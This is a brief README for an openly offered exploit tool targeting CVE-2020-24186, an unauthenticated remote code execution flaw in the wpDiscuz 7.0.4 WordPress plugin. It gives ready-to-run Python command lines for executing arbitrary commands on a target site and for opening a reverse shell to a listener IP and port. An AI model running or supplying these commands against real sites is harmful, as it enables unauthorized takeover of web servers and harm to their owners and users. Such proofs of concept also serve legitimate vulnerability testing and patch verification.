# wpDiscuz-7.0.4-PoC-RCE

- wpDiscuz 7.0.4 - Unauthenticated RCE
- Exploit Autor: Carlos Tuma - Bl4dsc4n
- CVE-2020-24186
- Docker / Linux compatible
- Modes:
-  - Command execution
-  - Reverse shell (/bin/sh)
- modificado https://www.exploit-db.com/exploits/49967

# Remote code execute
python3 wpdiscuz_rce.py   -u http://localhost:8080   -p "/?p=1" --cmd "id"

# reverse shell
python3 exploit.py -u http://localhost:8080 -p "/?p=1" --reverse --lhost 172.17.0.1 --lport 4444
